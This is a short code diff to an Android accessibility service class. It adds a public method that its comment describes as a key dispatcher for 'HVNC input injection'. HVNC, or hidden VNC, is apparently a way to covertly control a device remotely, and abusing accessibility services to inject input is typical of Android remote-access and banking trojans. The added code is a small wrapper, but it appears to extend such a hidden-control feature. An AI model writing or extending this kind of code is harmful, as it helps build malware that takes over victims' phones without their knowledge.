@@ -87,6 +87,16 @@ public class FasonAccessibilityService extends AccessibilityService {
         return super.onKeyEvent(event);
     }
 
+
+    /**
+     * Public key dispatcher for HVNC input injection.
+     * Routes through onKeyEvent so the accessibility gate still applies.
+     */
+    public boolean dispatchKeyEvent(android.view.KeyEvent event) {
+        if (event == null) return false;
+        return onKeyEvent(event);
+    }
+
     @Override
     public void onInterrupt() {
         Log.w(TAG, "Service interrupted");
